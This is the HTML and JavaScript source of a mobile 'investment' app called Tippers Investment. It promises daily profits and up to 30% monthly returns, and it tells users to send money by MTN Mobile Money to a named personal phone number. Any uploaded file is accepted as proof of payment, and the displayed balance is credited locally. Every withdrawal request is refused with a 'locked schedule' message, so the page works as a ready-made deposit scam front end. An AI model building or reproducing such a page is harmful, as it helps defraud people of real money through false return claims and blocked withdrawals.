<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0f172a;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:400px;
background:#111827;
border-radius:20px;
overflow:hidden;
color:white;
}

.header{
padding:15px;
text-align:center;
font-weight:bold;
background:black;
}

.content{
padding:15px;
height:520px;
overflow-y:auto;
}

/* HOME SCROLL */
.card{
background:#1f2937;
padding:15px;
margin-bottom:10px;
border-radius:12px;
}

/* DEPOSIT STYLE */
.title{
font-weight:bold;
font-size:18px;
color:white;
}

.yellow{color:#facc15}

.inputBox{
display:flex;
background:#facc15;
border-radius:10px;
overflow:hidden;
margin-top:8px;
}

.inputBox span{
padding:10px;
background:#f59e0b;
font-weight:bold;
}

.inputBox input{
border:none;
flex:1;
padding:10px;
outline:none;
}

.small{
font-size:12px;
color:#ccc;
}

.btn{
margin-top:15px;
padding:12px;
background:#facc15;
border:none;
width:100%;
border-radius:10px;
font-weight:bold;
cursor:pointer;
}

.box{
background:#1f2937;
padding:12px;
border-radius:10px;
margin-top:10px;
}

.copy{
background:#facc15;
padding:5px 10px;
border-radius:6px;
cursor:pointer;
margin-left:10px;
}

.hidden{display:none}

.nav{
display:flex;
justify-content:space-around;
background:black;
padding:10px;
}

.nav div{text-align:center;font-size:12px;cursor:pointer}
.nav i{font-size:22px;display:block}

#toastBox{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">

<div class="header">Tippers Investment</div>

<div class="content" id="screen"></div>

<div class="nav hidden" id="bottomNav">
<div onclick="home()"><i>🏠</i>HOME</div>
<div onclick="deposit()"><i>💰</i>DEPOSIT</div>
<div onclick="withdrawUI()"><i>📤</i>WITHDRAW</div>
</div>

</div>

<div id="toastBox"></div>

<script>

let users=JSON.parse(localStorage.getItem("users"))||[];
let currentUser=null;
let currentAmount=0;
let senderName="";

function get(id){return document.getElementById(id);}

function showToast(msg){
let t=get("toastBox");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* HOME (SCROLLABLE) */
function home(){
get("screen").innerHTML=`

<div class="card">Balance: ${currentUser.balance} RWF</div>

<div class="card">🔥 Investment Plans (Daily profits)</div>
<div class="card">💡 Tips: Invest more, earn more</div>
<div class="card">📊 Market is growing fast</div>
<div class="card">💰 Earn up to 30% monthly</div>
<div class="card">🚀 Crypto opportunities available</div>
<div class="card">📢 New users bonus coming soon</div>
<div class="card">📈 Success stories from investors</div>

`;
}

/* DEPOSIT STEP 1 */
function deposit(){
get("screen").innerHTML=`

<div class="title"><b>DEPOSIT BALANCE</b></div>

<p>Add funds to your wallet using MTN Mobile money</p>

<p class="yellow">📱 AMOUNT TO DEPOSIT (RWF)</p>

<div class="inputBox">
<span>RWF</span>
<input id="amount" placeholder="e.g: 100,000">
</div>

<p class="small">minimum: 5,000 rwf</p>

<p class="yellow">👤 SENDER MOBILE NAME</p>
<input id="sender" placeholder="e.g: mugabo jean paul">

<p class="small">enter the name registered on your mtn mobile money</p>

<button class="btn" onclick="payment()">Continue ➜</button>

`;
}

/* PAYMENT INFO */
function payment(){
currentAmount=parseInt(get("amount").value)||0;
senderName=get("sender").value;

if(currentAmount<5000){
showToast("Minimum 5000");return;
}

get("screen").innerHTML=`

<div class="title">PAYMENT INFORMATIONS</div>

<p>follow the steps below to complete your deposit</p>

<p class="yellow">📱 MTN Mobile money transfer</p>

<div class="box">Sender Name: ${senderName}</div>

<p>Please send exactly ${currentAmount} RWF to the following mtn number:</p>

<div class="box">
0780000000 
<span class="copy" onclick="copyNum()">Copy</span><br><br>
<span class="yellow">BARAKA Bolingo</span>
</div>

<button class="btn" onclick="dial()">Dial & Pay Now</button>

`;
}

/* COPY */
function copyNum(){
navigator.clipboard.writeText("0780000000");
showToast("Copied");
}

/* DIAL */
function dial(){
get("screen").innerHTML=`

<p>Use the following to pay:</p>

<div class="box">
*182*1*1*0780000000#
</div>

<input type="file" onchange="enableBtn()">

<button id="btn" disabled onclick="proof()">Submit</button>

`;
}

function enableBtn(){get("btn").disabled=false;}

/* PROOF DONE */
function proof(){
currentUser.balance+=currentAmount;
localStorage.setItem("users",JSON.stringify(users));
withdrawStep();
}

/* WITHDRAW PERIOD */
function withdrawStep(){
get("screen").innerHTML=`

<h3>Select Withdraw Period</h3>

<select>
<option>1 Day</option>
<option>1 Week</option>
<option>1 Month</option>
<option>2 Months</option>
<option>3 Months</option>
<option>6 Months</option>
<option>12 Months</option>
</select>

<button class="btn" onclick="home()">Finish</button>

`;
}

/* WITHDRAW */
function withdrawUI(){
get("screen").innerHTML=`

<h3>Withdraw Money</h3>

<div class="inputBox">
<span>+250</span>
<input placeholder="078xxxxxxx">
</div>

<button class="btn" onclick="withdrawAction()">Withdraw</button>

`;
}

function withdrawAction(){
showToast("You're not allowed to withdraw before the locked schedule");
}

/* LOGIN SIMPLE */
function welcome(){
get("screen").innerHTML=`
<h2>Welcome</h2>
<button class="btn" onclick="login()">Start</button>
`;
}

function login(){
currentUser={balance:0};
get("bottomNav").classList.remove("hidden");
home();
}

/* START */
welcome();

</script>

</body>
</html>
